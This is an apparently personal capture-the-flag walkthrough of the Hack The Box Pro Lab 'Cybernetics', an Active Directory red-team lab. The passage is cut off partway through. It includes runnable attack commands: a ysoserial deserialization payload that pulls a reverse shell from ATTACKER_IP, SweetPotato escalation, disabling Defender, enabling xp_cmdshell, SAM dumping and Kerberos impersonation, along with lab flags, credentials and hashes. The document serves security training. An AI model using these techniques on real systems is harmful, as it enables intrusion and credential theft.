@@ -1,0 +1,1015 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>HTB Pro Lab: Cybernetics — QA210</title>
+<meta name="description" content="Hack The Box Pro Lab Cybernetics — Red Team Assessment Active Directory walkthrough by QA210">
+<meta name="author" content="QA210">
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔗</text></svg>">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-xml-doc.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-json.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap');
+:root{--bg-primary:#0d1117;--bg-secondary:#161b22;--bg-tertiary:#1c2333;--bg-code:#0d1117;--border:#30363d;--border-light:#21262d;--text-primary:#e6edf3;--text-secondary:#8b949e;--text-muted:#6e7681;--accent-green:#3fb950;--accent-blue:#58a6ff;--accent-red:#f85149;--accent-yellow:#d29922;--accent-purple:#bc8cff;--accent-orange:#f0883e;--accent-cyan:#00d4aa;--link:#58a6ff;--link-hover:#79c0ff;--scrollbar-thumb:#30363d;--scrollbar-track:#161b22;--toc-active:#00d4aa;--callout-info-bg:rgba(0,212,170,0.08);--callout-info-border:#00d4aa;--callout-warn-bg:rgba(210,153,34,0.1);--callout-warn-border:#d29922;--callout-danger-bg:rgba(248,81,73,0.1);--callout-danger-border:#f85149;--callout-success-bg:rgba(63,185,80,0.1);--callout-success-border:#3fb950}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scrollbar-width:thin;scrollbar-color:var(--scrollbar-thumb) var(--scrollbar-track)}
+body{font-family:'Inter',-apple-system,BlinkMacSystemFont,sans-serif;background:var(--bg-primary);color:var(--text-primary);line-height:1.75;font-size:16px}
+#three-bg{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:-1;pointer-events:none;opacity:0.3}
+::-webkit-scrollbar{width:8px;height:8px}::-webkit-scrollbar-track{background:var(--scrollbar-track)}::-webkit-scrollbar-thumb{background:var(--scrollbar-thumb);border-radius:4px}::-webkit-scrollbar-thumb:hover{background:#484f58}
+a{color:var(--link);text-decoration:none;transition:color .2s}a:hover{color:var(--link-hover)}
+.site-header{position:sticky;top:0;z-index:100;background:rgba(13,17,23,0.85);backdrop-filter:blur(12px);border-bottom:1px solid var(--border);padding:0 2rem;height:56px;display:flex;align-items:center;justify-content:space-between}
+.site-header .logo{font-family:'JetBrains Mono',monospace;font-weight:700;font-size:1.15rem;color:var(--accent-cyan);display:flex;align-items:center;gap:8px}
+.site-header .logo .dot{color:var(--accent-red)}
+.site-header nav{display:flex;gap:1.5rem;align-items:center}
+.site-header nav a{color:var(--text-secondary);font-size:.875rem;font-weight:500}
+.site-header nav a:hover{color:var(--text-primary)}
+.hamburger{display:none;background:none;border:none;color:var(--text-primary);cursor:pointer;font-size:1.5rem}
+.page-layout{display:grid;grid-template-columns:260px 1fr;max-width:1400px;margin:0 auto;min-height:calc(100vh - 56px)}
+.toc-sidebar{position:sticky;top:56px;height:calc(100vh - 56px);overflow-y:auto;padding:1.5rem 1rem 1.5rem 1.5rem;border-right:1px solid var(--border);background:var(--bg-primary)}
+.toc-sidebar h3{font-size:.75rem;text-transform:uppercase;letter-spacing:.08em;color:var(--text-muted);margin-bottom:.75rem;font-weight:600}
+.toc-sidebar ul{list-style:none}.toc-sidebar li{margin-bottom:2px}
+.toc-sidebar a{display:block;padding:4px 8px;border-radius:4px;font-size:.8rem;color:var(--text-secondary);transition:all .15s;line-height:1.4}
+.toc-sidebar a:hover{color:var(--text-primary);background:var(--bg-secondary)}
+.toc-sidebar a.active{color:var(--toc-active);background:rgba(0,212,170,0.1);font-weight:600}
+.toc-sidebar .toc-h3{padding-left:18px;font-size:.75rem}
+.main-content{padding:2.5rem 3rem 4rem;max-width:860px;width:100%}
+.page-hero{margin-bottom:2.5rem;padding-bottom:2rem;border-bottom:1px solid var(--border)}
+.page-hero .box-badge{display:inline-block;background:var(--accent-cyan);color:#000;font-size:.7rem;font-weight:700;padding:2px 10px;border-radius:12px;text-transform:uppercase;letter-spacing:.05em;margin-bottom:.75rem}
+.page-hero h1{font-size:2.25rem;font-weight:800;margin-bottom:.5rem;letter-spacing:-.02em}
+.page-hero .meta{color:var(--text-secondary);font-size:.875rem;display:flex;flex-wrap:wrap;gap:.75rem;align-items:center}
+.page-hero .meta .sep{color:var(--text-muted)}
+.breadcrumbs{font-size:.75rem;color:var(--text-muted);margin-bottom:1rem;font-family:'JetBrains Mono',monospace}
+.breadcrumbs a{color:var(--text-secondary)}.breadcrumbs a:hover{color:var(--link)}.breadcrumbs .sep{margin:0 .4rem}
+.box-info-card{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin-bottom:2rem;display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:1rem}
+.box-info-card .info-item .label{font-size:.7rem;text-transform:uppercase;letter-spacing:.06em;color:var(--text-muted);margin-bottom:2px;font-weight:600}
+.box-info-card .info-item .value{font-size:.95rem;font-weight:600;color:var(--text-primary)}
+.main-content h2{font-size:1.6rem;font-weight:800;margin:2.5rem 0 1rem;padding-bottom:.4rem;border-bottom:2px solid var(--border);letter-spacing:-.01em;scroll-margin-top:70px}
+.main-content h3{font-size:1.15rem;font-weight:700;margin:1.75rem 0 .75rem;color:var(--text-primary);scroll-margin-top:70px}
+.main-content h4{font-size:1rem;font-weight:600;margin:1.25rem 0 .5rem;color:var(--text-secondary)}
+.main-content p{margin-bottom:1rem;color:var(--text-secondary);line-height:1.8}
+.code-block-wrapper{position:relative;margin:1rem 0 1.25rem;border-radius:8px;overflow:hidden;border:1px solid var(--border)}
+.code-block-header{display:flex;justify-content:space-between;align-items:center;padding:6px 14px;background:var(--bg-tertiary);border-bottom:1px solid var(--border);font-size:.72rem;color:var(--text-muted);font-family:'JetBrains Mono',monospace}
+.code-block-header .lang-label{text-transform:uppercase;font-weight:600;letter-spacing:.04em}
+.copy-btn{background:none;border:1px solid var(--border);color:var(--text-muted);font-size:.7rem;padding:2px 10px;border-radius:4px;cursor:pointer;font-family:'JetBrains Mono',monospace;transition:all .2s}
+.copy-btn:hover{color:var(--text-primary);border-color:var(--text-muted)}.copy-btn.copied{color:var(--accent-green);border-color:var(--accent-green)}
+.code-block-wrapper pre{margin:0!important;padding:1rem!important;background:var(--bg-code)!important;font-family:'JetBrains Mono',monospace!important;font-size:.82rem!important;line-height:1.6!important;overflow-x:auto}
+.code-block-wrapper code{font-family:'JetBrains Mono',monospace!important;font-size:.82rem!important}
+p code,li code{background:var(--bg-tertiary);border:1px solid var(--border);padding:1px 6px;border-radius:4px;font-family:'JetBrains Mono',monospace;font-size:.82em;color:var(--accent-orange)}
+.callout{padding:.85rem 1rem;border-radius:6px;border-left:3px solid;margin:1rem 0 1.25rem;font-size:.9rem}
+.callout p{margin:0;color:var(--text-secondary)}.callout-title{font-weight:700;font-size:.8rem;text-transform:uppercase;letter-spacing:.04em;margin-bottom:4px}
+.callout-info{background:var(--callout-info-bg);border-color:var(--callout-info-border)}.callout-info .callout-title{color:var(--callout-info-border)}
+.callout-warn{background:var(--callout-warn-bg);border-color:var(--callout-warn-border)}.callout-warn .callout-title{color:var(--callout-warn-border)}
+.callout-danger{background:var(--callout-danger-bg);border-color:var(--callout-danger-border)}.callout-danger .callout-title{color:var(--callout-danger-border)}
+.callout-success{background:var(--callout-success-bg);border-color:var(--callout-success-border)}.callout-success .callout-title{color:var(--callout-success-border)}
+.attack-path{background:var(--bg-secondary);border:1px solid var(--border);border-radius:8px;padding:1.25rem 1.5rem;margin:1.5rem 0;font-family:'JetBrains Mono',monospace;font-size:.78rem;line-height:1.7;overflow-x:auto}
+.attack-path .step{display:flex;align-items:baseline;gap:.5rem;margin-bottom:.25rem}
+.attack-path .arrow{color:var(--accent-cyan)}.attack-path .host{color:var(--accent-cyan);font-weight:700}.attack-path .technique{color:var(--accent-orange)}.attack-path .cred{color:var(--accent-purple)}.attack-path .finding{color:var(--accent-green)}
+.flag-box{background:rgba(0,212,170,0.06);border:1px solid rgba(0,212,170,0.25);border-radius:8px;padding:1rem 1.25rem;margin:1rem 0 1.5rem;font-family:'JetBrains Mono',monospace}
+.flag-box .flag-label{font-size:.7rem;text-transform:uppercase;letter-spacing:.08em;color:var(--accent-cyan);font-weight:700;margin-bottom:.35rem}
+.flag-box .flag-value{font-size:1rem;font-weight:700;color:var(--text-primary);word-break:break-all}
+.main-content ul,.main-content ol{margin:.5rem 0 1rem 1.5rem;color:var(--text-secondary)}.main-content li{margin-bottom:.35rem;line-height:1.7}
+.main-content table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.85rem}
+.main-content th,.main-content td{padding:8px 12px;border:1px solid var(--border);text-align:left}
+.main-content th{background:var(--bg-secondary);font-weight:600;color:var(--text-primary);font-size:.75rem;text-transform:uppercase;letter-spacing:.04em}
+.main-content td{color:var(--text-secondary)}
+.site-footer{border-top:1px solid var(--border);padding:1.5rem 2rem;text-align:center;color:var(--text-muted);font-size:.8rem}
+.toc-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:200}.toc-overlay.show{display:block}
+.toc-mobile-panel{display:none;position:fixed;left:0;top:0;bottom:0;width:280px;background:var(--bg-primary);border-right:1px solid var(--border);z-index:201;overflow-y:auto;padding:1.5rem}
+.toc-mobile-panel.show{display:block}
+.toc-mobile-panel .close-btn{background:none;border:none;color:var(--text-secondary);font-size:1.2rem;cursor:pointer;float:right}
+@media(max-width:1024px){.page-layout{grid-template-columns:1fr}.toc-sidebar{display:none}.hamburger{display:block}.main-content{padding:1.5rem 1.25rem 3rem}.page-hero h1{font-size:1.75rem}}
+@media(max-width:640px){.site-header{padding:0 1rem}.main-content{padding:1rem .75rem 2rem}.page-hero h1{font-size:1.4rem}.box-info-card{grid-template-columns:1fr 1fr}}
+</style>
+</head>
+<body>
+<canvas id="three-bg"></canvas>
+
+<header class="site-header">
+  <div class="logo"><span>QA210</span><span class="dot">:</span><span>~$</span></div>
+  <nav><a href="/">Home</a><a href="/htb/prolab/">Pro Labs</a><a href="#">Tools</a><a href="#">About</a></nav>
+  <button class="hamburger" onclick="toggleMobileToc()" aria-label="Menu">&#9776;</button>
+</header>
+
+<div class="toc-overlay" id="tocOverlay" onclick="toggleMobileToc()"></div>
+<div class="toc-mobile-panel" id="tocMobilePanel">
+  <button class="close-btn" onclick="toggleMobileToc()">&#10005;</button>
+  <h3 style="margin-top:1rem">Contents</h3>
+  <ul id="tocMobile"></ul>
+</div>
+
+<div class="page-layout">
+<aside class="toc-sidebar"><h3>Contents</h3><ul id="tocDesktop"></ul></aside>
+<main class="main-content">
+
+<div class="page-hero">
+  <div class="breadcrumbs"><a href="/">Home</a><span class="sep">/</span><a href="/htb/prolab/">HTB Pro Lab</a><span class="sep">/</span>Cybernetics</div>
+  <span class="box-badge">Pro Lab</span>
+  <h1>HTB Pro Lab: Cybernetics</h1>
+  <div class="meta"><span>QA210</span><span class="sep">&middot;</span><span>2025</span><span class="sep">&middot;</span><span>Red Team &middot; Active Directory &middot; 25 Flags</span></div>
+</div>
+
+<div class="box-info-card">
+  <div class="info-item"><div class="label">Lab</div><div class="value">Cybernetics</div></div>
+  <div class="info-item"><div class="label">Category</div><div class="value" style="color:var(--accent-cyan)">Red Team Operator Level II</div></div>
+  <div class="info-item"><div class="label">Domains</div><div class="value">5 (cyber, core, m3c, d3v, inception)</div></div>
+  <div class="info-item"><div class="label">Flags</div><div class="value">25</div></div>
+  <div class="info-item"><div class="label">Machines</div><div class="value">28+</div></div>
+  <div class="info-item"><div class="label">Key Techniques</div><div class="value">AD, Kerberos, RBCD, DCSync, Phishing, DevOps</div></div>
+</div>
+
+<div class="attack-path">
+  <div class="step"><span class="host">CYWEBDW</span> <span class="arrow">&rarr;</span> <span class="technique">DNN Deserialization</span> <span class="arrow">&rarr;</span> <span class="finding">Flag 1</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">SweetPotato</span> <span class="arrow">&rarr;</span> <span class="technique">SQL Link Crawl</span> <span class="arrow">&rarr;</span> <span class="host">M3SQLW</span> <span class="arrow">&rarr;</span> <span class="finding">Flag 2</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">Constrained Delegation</span> <span class="arrow">&rarr;</span> <span class="host">M3WEBAW</span> <span class="arrow">&rarr;</span> <span class="finding">Flag 3</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">RBCD</span> <span class="arrow">&rarr;</span> <span class="host">M3DC</span> <span class="arrow">&rarr;</span> <span class="finding">Flag 4</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">Drupalgeddon2</span> <span class="arrow">&rarr;</span> <span class="host">COREWEBDL</span> <span class="arrow">&rarr;</span> <span class="finding">Flag 5</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">adtool enum</span> <span class="arrow">&rarr;</span> <span class="finding">Flag 6</span> <span class="arrow">&rarr;</span> <span class="technique">ADCS + OWA</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">Phishing</span> <span class="arrow">&rarr;</span> <span class="host">COREWKT001</span> <span class="arrow">&rarr;</span> <span class="finding">Flag 7</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">AlwaysInstallElevated + Code Signing</span> <span class="arrow">&rarr;</span> <span class="finding">Flags 8-9</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">RBCD</span> <span class="arrow">&rarr;</span> <span class="host">COREWKT002</span> <span class="arrow">&rarr;</span> <span class="finding">Flag 10</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="host">COREWEBTW</span> <span class="technique">Tomcat WAR</span> <span class="arrow">&rarr;</span> <span class="finding">Flag 11</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">Unconstrained Delegation + DCSync</span> <span class="arrow">&rarr;</span> <span class="finding">Flags 12-15</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="host">MONITOR</span> <span class="technique">Zabbix RCE</span> <span class="arrow">&rarr;</span> <span class="finding">Flag 16</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="host">D3WEBJW</span> <span class="technique">Jenkins SAML</span> <span class="arrow">&rarr;</span> <span class="finding">Flag 17</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">Vault + Ansible</span> <span class="arrow">&rarr;</span> <span class="finding">Flags 18-20</span></div>
+  <div class="step"><span class="arrow">&rarr;</span> <span class="technique">Inception Domain</span> <span class="arrow">&rarr;</span> <span class="finding">Flags 21-25</span></div>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="overview">Lab Overview</h2>
+
+<p>Cybernetics is an immersive enterprise Active Directory environment that features advanced infrastructure across five interconnected domains. Cybernetics LLC have enlisted your services to perform a red team assessment on their environment. The enterprise has gone through multiple pentest engagements, iteratively hardening their environment each time, and therefore has a more mature security posture. Many protection technologies are present and the modern operating systems are fully updated.</p>
+
+<p>This Red Team Operator Level II lab focuses on Microsoft and DevOps/automation technologies. It is an extremely challenging and modern environment that pushes you to the limit across enumeration, exploitation, lateral movement, persistence and privilege escalation. There are 25 flags to capture along the way, some on the main attack path and others in side-quests. The lab exposes players to: Active Directory enumeration and exploitation, breakout techniques, evading endpoint protections, Kerberos abuse, lateral movement, phishing, privilege escalation, and web application attacks.</p>
+
+<h3 id="hosts-file">Hosts File Configuration</h3>
+
+<p>Before starting, configure your <code>/etc/hosts</code> with all discovered hosts:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Cybernetics Perimeter
+10.10.110.10  cywebdw
+10.10.110.11  certenroll.cyber.local
+10.10.110.12  mail.cyber.local jenkins.cyber.local adfs.cyber.local
+10.10.110.15  cygw.cyber.local
+10.10.110.250 CYBERNETICS-FW
+
+# CYBER.LOCAL
+10.9.10.10    cydc.cyber.local cyber.local
+10.9.10.11    cyadfs.cyber.local
+10.9.10.12    cywap.cyber.local
+10.9.10.13    cymx.cyber.local
+10.9.10.14    cyfs.cyber.local
+10.9.10.18    cyapp.cyber.local
+10.9.10.17    cygw.cyber.local
+
+# CORE.CYBER.LOCAL
+10.9.15.10    coredc.core.cyber.local
+10.9.15.11    corewebdl.core.cyber.local
+10.9.15.12    corewebtw.core.cyber.local
+10.9.15.200   corewkt001.core.cyber.local
+10.9.15.201   corewkt002.core.cyber.local
+
+# M3C.LOCAL
+10.9.20.10    m3dc.m3c.local
+10.9.20.11    m3sqlw.m3c.local
+10.9.20.12    m3webaw.m3c.local
+10.9.20.13    cywebdw
+
+# D3V.LOCAL
+10.9.30.10    d3v.local
+10.9.30.11    ansible.cyber.local
+10.9.30.13    vault.cyber.local
+
+# INCEPTION.LOCAL
+10.9.40.5     indc.inception.local
+10.9.40.11    gitlab.inception.local
+10.9.40.12    inwebjw.inception.local
+10.9.40.200   inwkt001.inception.local
+10.9.40.201   inwkt002.inception.local</code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="perimeter-enum">Perimeter Enumeration</h2>
+
+<p>The initial entry point is the 10.10.110.0/24 subnet. A comprehensive Nmap scan of the perimeter reveals several interesting services. The primary target is 10.10.110.10 which runs Microsoft IIS httpd 10.0 on port 80, hosting a DotNetNuke (DNN) CMS application. This becomes our foothold vector.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Nmap scan of the perimeter host
+nmap -sC -sV -p- 10.10.110.10
+
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Microsoft IIS httpd 10.0
+443/tcp closed https
+3391/tcp closed savant
+49443/tcp closed unknown</code></pre>
+</div>
+
+<p>Other perimeter machines include 10.10.110.11 (certenroll.cyber.local) running IIS with SSL certificates revealing the <code>cyber.local</code> domain, 10.10.110.12 running mail/Jenkins/ADFS services, 10.10.110.15 (cygw.cyber.local) with a default IIS page and an RPC endpoint, and 10.10.110.250 running an OPNsense firewall login page.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="foothold-cywebdw">Foothold &mdash; CYWEBDW (10.10.110.10)</h2>
+
+<h3 id="dnn-enumeration">DNN CMS Enumeration</h3>
+
+<p>Port 80 reveals a DotNetNuke (DNN) CMS application. The <code>robots.txt</code> file contains standard DNN disallow entries for paths like <code>/admin/</code>, <code>/App_Browsers/</code>, <code>/App_Code/</code>, <code>/DesktopModules/</code> and others. Directory scanning with ffuf confirms the CMS and discovers useful paths including <code>privacy/</code>, <code>home/</code>, <code>logoff/</code>, <code>terms/</code>, and critically <code>robots.txt</code> and <code>desktopmodules/</code>.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash">ffuf -u http://10.10.110.10/FUZZ -w /weblists/raft-medium-words-lowercase.txt -e /,.txt,.html,.php</code></pre>
+</div>
+
+<p>A <code>flag.txt</code> file is directly accessible on the web server, which also hints at the exploitation method:</p>
+
+<div class="flag-box"><div class="flag-label">Flag 1 — Deserialization</div><div class="flag-value">Cyb3rN3t1C5{De$3R!al!z@ti0n}</div></div>
+
+<h3 id="dnn-deserialization">DNN Deserialization Exploit</h3>
+
+<p>The flag name strongly suggests the exploitation vector. DNN has a known insecure deserialization vulnerability in the <code>DNNPersonalization</code> cookie that allows remote code execution through ysoserial.net. The vulnerability exists because DNN deserializes user preference cookies without proper type restrictions, allowing an attacker to inject arbitrary .NET objects.</p>
+
+<p>First, we test the exploit by reading a file using ysoserial's built-in DotNetNuke plugin:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Generate a payload to read win.ini via DNN deserialization
+.\ysoserial.exe -p DotNetNuke -m read_file -f C:\Windows\win.ini</code></pre>
+</div>
+
+<p>The generated payload is set as the <code>DNNPersonalization</code> cookie in an HTTP request to the server. The request must 404 for the deserialization to trigger properly. Upon success, the contents of <code>win.ini</code> are returned in the response, confirming the vulnerability works.</p>
+
+<h3 id="getting-shell-cywebdw">Getting a Shell</h3>
+
+<p>To obtain a proper shell, we modify the ysoserial payload to use the <code>UploadFile1.xml</code> technique. This method leverages the <code>PullFile</code> method of <code>FileSystemUtils</code> to download a file from our attacker machine and save it to the target filesystem. Since <code>c:\dotnetnuke\</code> is the working directory of the application, files placed there are accessible via the web server.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">xml</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-xml">&lt;ProjectedProperty0&gt;
+  &lt;MethodName&gt;PullFile&lt;/MethodName&gt;
+  &lt;MethodParameters&gt;
+    &lt;anyType type="xsd:string"&gt;http://ATTACKER_IP/shell.aspx&lt;/anyType&gt;
+    &lt;anyType type="xsd:string"&gt;C:\dotnetnuke\shell.aspx&lt;/anyType&gt;
+  &lt;/MethodParameters&gt;
+&lt;/ProjectedProperty0&gt;</code></pre>
+</div>
+
+<p>This downloads <code>shell.aspx</code> (an ASPX reverse shell) from our machine and uploads it to <code>C:\dotnetnuke\shell.aspx</code>, which is then accessible at <code>http://10.10.110.10/shell.aspx</code>. Browsing to this page triggers the reverse shell, giving us initial foothold as a low-privileged user on CYWEBDW.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="privesc-cywebdw">Privilege Escalation &mdash; CYWEBDW</h2>
+
+<p>Running <code>whoami /priv</code> reveals <code>SeImpersonatePrivilege</code> is enabled, which is the classic path to SYSTEM on Windows machines. We upload SweetPotato (a Potato family exploit) and execute it to escalate to <code>NT AUTHORITY\SYSTEM</code>:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Escalate to SYSTEM using SweetPotato
+.\sweetpotato.exe -p c:\programdata\win64.exe -e EfsRpc</code></pre>
+</div>
+
+<p>With SYSTEM access, we disable Windows Defender to allow tool execution without interference:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell">Set-MpPreference -DisableRealtimeMonitoring $true</code></pre>
+</div>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="m3sqlw">Lateral Movement &mdash; SQL Server Link Crawl to M3SQLW</h2>
+
+<p>Attempting to dump credentials with mimikatz yields no useful hashes on this machine since it is not domain-joined. However, running PowerUpSQL reveals linked SQL servers. The <code>Get-SQLServerLinkCrawl</code> command discovers that CYWEBDW has a linked SQL server &mdash; M3SQLW &mdash; and we have SA-level access through the link.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Import PowerUpSQL and discover linked servers
+. .\PowerUpSQL.ps1
+Get-SQLServerLinkCrawl -Verbose</code></pre>
+</div>
+
+<p>Since we have SA privileges on M3SQLW through the SQL link, we can enable <code>xp_cmdshell</code> and execute system commands. The commands must be run through the linked server using the <code>AT</code> clause, with nested quotes escaped:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Enable advanced options on M3SQLW via linked server
+osql -E -S "CYWEBDW" -Q "EXEC('sp_configure ''show advanced options'',1;RECONFIGURE;') AT [m3sqlw.m3c.local]"
+
+# Enable xp_cmdshell
+osql -E -S "CYWEBDW" -Q "EXEC('sp_configure ''xp_cmdshell'',1;RECONFIGURE;') AT [m3sqlw.m3c.local]"
+
+# Execute commands on M3SQLW
+osql -E -S "CYWEBDW" -Q "EXEC('xp_cmdshell whoami') AT [m3sqlw.m3c.local]"</code></pre>
+</div>
+
+<p>M3SQLW is domain-joined to m3c.local, making it the gateway into the Active Directory portion of the lab. To bypass endpoint protection on the target, an obfuscated PowerShell reverse shell is uploaded and executed, providing a stable shell on the machine.</p>
+
+<div class="flag-box"><div class="flag-label">Flag 2 — SQL Server Link Crawl</div><div class="flag-value">Cyb3rN3t1C5{Sql$erv3rL!nkCr@wl}</div></div>
+
+<h3 id="m3sqlw-privesc">Privilege Escalation on M3SQLW</h3>
+
+<p>Again, <code>SeImpersonatePrivilege</code> is present. SweetPotato provides SYSTEM access. Since this machine is domain-joined, we can now run SharpHound to collect BloodHound data and dump local SAM hashes using the registry hive method:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-bash"># Dump registry hives for offline hash extraction
+reg save HKLM\SAM sam
+reg save HKLM\SYSTEM system
+
+# Extract hashes offline
+secretsdump.py -sam sam -system system LOCAL</code></pre>
+</div>
+
+<p>This produces the local Administrator hash for M3DC:</p>
+<p><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:a4650d24d20a42fefcc254fc591ebf43:::</code></p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="m3webaw">Constrained Delegation &mdash; M3WEBAW (10.9.20.12)</h2>
+
+<p>BloodHound analysis reveals that <code>svc_sql</code> has constrained delegation over <code>m3webaw.m3c.local</code>. The SPN <code>time/m3webaw.m3c.local</code> maps to HOST, meaning we can obtain service tickets for the machine. The exploitation path requires obtaining a TGT for svc_sql, then using S4U2Self and S4U2Proxy to impersonate a domain admin.</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell"># Kerberoast svc_sql to get TGT
+.\Rubeus.exe kerberoast /target:svc_sql
+
+# Get a usable TGT via tgtdeleg
+.\Rubeus.exe tgtdeleg
+
+# S4U to impersonate Michael.Crosley (Domain Admin)
+.\Rubeus.exe s4u /ticket:<TGT_BASE64> /impersonateuser:Michael.Crosley /msdsspn:http/m3webaw.m3c.local /ptt</code></pre>
+</div>
+
+<p>With the ticket for Michael.Crosley, we can create a WinRM session to M3WEBAW and execute commands:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell">$session = new-pssession -computername m3webaw.m3c.local
+invoke-command $session { iwr -usebasicparsing -outfile win64.exe 10.10.14.150/win64 }</code></pre>
+</div>
+
+<h3 id="activemq-creds">ActiveMQ Credentials</h3>
+
+<p>An ActiveMQ installation is found in the root directory. Examining configuration files reveals credentials and a flag:</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+  <pre><code class="language-powershell">type c:\activeMQ\conf\jetty-realm.properties
+# admin:3f18DV^t!svBV4ntcrLRTWi2XaMCDK
+
+type c:\activeMQ\conf\jetty.xml
+# Web console on port 8161</code></pre>
+</div>
+
+<div class="flag-box"><div class="flag-label">Flag 3 — Credentials in Files</div><div class="flag-value">Cyb3rN3t1C5{CR3d$_!n_fil3s}</div></div>
+
+<h3 id="jsp-upload">Shell via JSP Upload</h3>
+
+<p>The ActiveMQ web console on port 8161 runs JSP pages. Since we have filesystem access, we can write a JSP shell to the web application directory and trigger it through the browser. The <code>svc_apache</code> user is obtained through this method, which becomes important for the next lateral movement step.</p>
+
+<!-- ══════════════════════════════════════════════════════════════════════ -->
+<h2 id="m3dc">RBCD &mdash; M3DC (10.9.20.10)</h2>
+
+<p>BloodHound shows that <code>svc_apache</code> has <code>GenericWrite</code> over M3DC. This means we can perform Resource-Based Constrained Delegation (RBCD) by setting the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute on M3DC, allowing a machine account we control to delegate and impersonate any user.</p>
+
+<p>Since AMSI is enabled, a bypass is required before loading PowerShell tools. The attack chain involves uploading an AMSI bypass script (<code>ligma.ps1</code>), the RBCD setup script (<code>root.ps1</code>), and a combined execution script (<code>doit.ps1</code>):</p>
+
+<div class="code-block-wrapper">
+  <div class="code-block-header"><span class="lang-label">powershell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
